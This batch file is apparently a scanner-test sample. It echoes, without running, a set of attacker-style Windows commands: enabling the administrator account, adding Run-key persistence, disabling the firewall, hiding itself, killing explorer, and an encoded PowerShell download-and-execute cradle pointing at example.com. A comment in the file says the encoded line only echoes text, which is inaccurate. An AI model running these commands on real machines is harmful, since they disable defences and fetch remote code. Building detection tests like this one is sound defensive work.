@echo off
REM This is a test batch file designed to look suspicious for scanner testing
REM It does not perform any harmful actions

echo THIS IS A TEST FILE - No malicious actions will be performed
echo This file is designed to trigger security scanners for testing purposes

REM Suspicious strings that should trigger scanner
echo Would run: net user administrator /active:yes
echo Would run: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilService /t REG_SZ /d %~f0 /f
echo Would run: netsh firewall set opmode disable
echo Would run: attrib +h +s %~f0
echo Would run: taskkill /f /im explorer.exe

REM Base64 encoded PowerShell command (just echoes text)
echo Would run: powershell -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0AJwApAA==

echo Test complete. If your scanner detected this file, it's working correctly! 